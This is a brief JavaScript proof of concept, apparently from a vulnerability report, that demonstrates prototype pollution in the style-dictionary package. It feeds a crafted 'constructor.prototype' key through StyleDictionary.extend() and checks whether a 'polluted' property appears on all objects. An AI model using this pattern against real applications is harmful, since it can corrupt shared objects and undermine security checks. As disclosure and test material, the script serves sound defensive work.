Reflect.getPrototypeOf = () => false;
const StyleDictionary = require('style-dictionary');
const obj = {};
let opts = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
console.log({}.polluted);
StyleDictionary.extend(opts);
console.log({}.polluted);